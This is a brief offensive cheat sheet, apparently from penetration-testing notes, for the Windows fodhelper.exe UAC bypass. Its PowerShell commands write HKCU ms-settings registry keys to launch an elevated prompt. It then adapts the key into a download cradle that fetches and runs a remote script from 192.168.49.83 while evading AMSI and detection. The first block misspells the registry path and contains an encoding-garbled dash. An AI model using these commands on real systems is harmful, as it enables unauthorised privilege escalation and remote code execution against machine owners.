# The following 3 commands will open a high priv powershell prompt

New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value powershell.exe â€“Force
New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe

# Weaponizing this in Metasploit will most likely get caught

# Instead, setup the reg key as a download cradle that bypasses AMSI and initiates the shell

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.49.83/run_pass.txt') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe